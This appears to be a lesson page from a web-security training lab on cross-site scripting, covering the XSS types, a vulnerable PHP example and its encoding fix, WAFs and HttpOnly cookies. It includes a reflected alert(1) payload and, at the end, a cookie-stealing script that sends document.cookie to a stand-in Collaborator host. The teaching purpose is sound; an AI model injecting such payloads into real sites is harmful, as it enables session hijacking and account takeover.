Cross-Site Scripting (XSS)

Understand the attack before you execute it. A hacker who cannot explain the why is just clicking buttons.

📖 What is XSS?

Cross-Site Scripting (XSS) occurs when a web application takes user-supplied input and inserts it into a webpage without proper validation or encoding. The browser then interprets this input as code — not data — and executes it.

User Input
→
Application Reflects It
→
Browser Renders HTML
→
Script Executes!
Key Insight: The vulnerability is not in the browser. The browser is doing exactly what it's supposed to: running JavaScript it found on a trusted page. The failure is in the application not treating user input as data.
🔐 The Browser Trust Model

Browsers apply the Same-Origin Policy: scripts from bank.com can access cookies and DOM from bank.com.

  • Browser trusts anything served from a domain
  • Injected script is served from the victim site
  • So the injected script inherits ALL permissions of that site
  • It can read cookies, make requests, modify the DOM
Attacker Mindset: I don't need to break into the server. I just need to make the server serve my code to users. Their browser does the rest.
⚠️ Why XSS is Dangerous
  • Session Hijacking Steal cookies → access accounts without a password
  • Keylogging Capture every keystroke silently
  • Phishing Inject fake login forms on a real site
  • Defacement Modify the visible page for all users
  • Credential Theft Read autofill passwords
🗂️ The 3 Types of XSS
Reflected
Payload is in the URL/request. Server reflects it immediately. Only affects users who click the malicious link.
URL: ?q=<script>alert(1)</script>
⚡ Requires victim to click a link
Stored
Payload is saved to the database. Executes for every user who views the page. No special link needed.
Posted in: comments, profiles, messages
💀 Most dangerous — mass victims
DOM-Based
The vulnerability is entirely client-side. JavaScript reads attacker-controlled data (URL hash, etc.) and writes it to the DOM.
document.innerHTML = location.hash
🕵️ Server never sees the payload
🧪 A Minimal XSS Example

Here's a vulnerable PHP snippet — the kind found in millions of real applications:

VULNERABLE CODE (PHP)
<?php
// User searches for something
$query = $_GET['q'];

// Developer outputs it directly — NO ENCODING
echo "<p>You searched for: " . $query . "</p>";
?>

If the user inputs <script>alert(1)</script>, the server outputs:

SERVER OUTPUT (DANGEROUS)
<p>You searched for: <script>alert(1)</script></p>

The browser sees valid HTML with a script tag — and runs it. The fix? One function: htmlspecialchars($query) in PHP, or equivalent encoding in any language.

The fix is simple. The finding is the skill. That's what you'll practice in these labs.

Before injecting anything, we need to confirm that user input is actually reflected back in the server's response. This is the first diagnostic step in testing for Reflected XSS.

If user input appears in the HTML response, the browser will parse it. If we can get the browser to parse our input as code instead of text, we have XSS.

Now we replace our benign input with a JavaScript payload. The simplest XSS test payload is:

🧠 Why alert(1)?

It's the universal proof-of-concept for XSS. If alert(1) runs, it proves we can execute any JavaScript — including dangerous code like cookie theft. The number 1 is just a marker so you know which payload fired.

🧠 What happens internally?

  1. You submit <script>alert(1)</script> as the search query
  2. Server builds response: You searched for: <script>alert(1)</script>
  3. Browser receives this and parses the HTML
  4. Browser finds a <script> tag and executes it
  5. Alert fires — XSS confirmed

🌍 Real-World Attack Scenario

This Reflected XSS means an attacker could:

  1. Craft a malicious URL: http://testphp.vulnweb.com/search.php?q=<script>...steal-cookie...</script>
  2. Send this link to a victim via email, social media, phishing message
  3. Victim clicks the link (trusts the domain — it's a real site!)
  4. The malicious script runs in the victim's browser with full cookie access
  5. Attacker receives the session cookie and logs in as the victim
Why victims trust it: The URL points to a real, legitimate website. Email filters won't block it. The browser shows a valid SSL certificate. The domain looks trustworthy. This is what makes Reflected XSS so effective for targeted attacks.

Root Cause: No output encoding — user input rendered as HTML
Severity: HIGH
Fix: HTML-encode output — e.g., htmlspecialchars() in PHP

🎯 What is a WAF?

A Web Application Firewall (WAF) inspects HTTP requests and blocks ones that match known attack patterns. It's the security layer between the internet and the application.

🧠 Why doesn't a WAF fully stop XSS?

WAFs work on pattern matching — they block known payloads. But HTML is enormous. There are hundreds of tags, thousands of event attributes, and infinite encoding combinations. A WAF that tries to block "everything dangerous" is fighting an impossible battle.

Confirm Stored XSS & Understand document.cookie

🎯 What is document.cookie?

Every website can store cookies in your browser. Session cookies hold your login token — the server uses them to identify you. JavaScript running on a page can read document.cookie and get all cookies for that domain.

// In browser console on your bank website:
document.cookie
// Returns: "session=abc123; _csrf=xyz; preferences=dark"
// The session token is all an attacker needs to log in as you

🧠 Why aren't cookies protected?

Cookies are accessible to JavaScript by design — legitimate site code often reads them. The HttpOnly flag prevents this, but many sites fail to set it. If a cookie lacks HttpOnly, XSS can steal it.

🛰️ Burp Collaborator — Your Listening Server

Burp Collaborator gives you a unique domain (e.g., abc123.oastify.com). Any HTTP request to that domain is logged and visible in Burp. This is called out-of-band (OOB) data exfiltration.

COOKIE STEALING PAYLOAD
<script>
fetch('https://YOUR-COLLABORATOR.oastify.com/?cookie=' + document.cookie);
</script>

🧠 How it works:

  1. document.cookie reads all cookies for the current domain
  2. fetch() sends an HTTP GET request to your Collaborator domain
  3. The cookie value is appended to the URL as a parameter
  4. Burp Collaborator logs the incoming request — including the URL with the cookie
  5. You can see the victim's session token in Burp
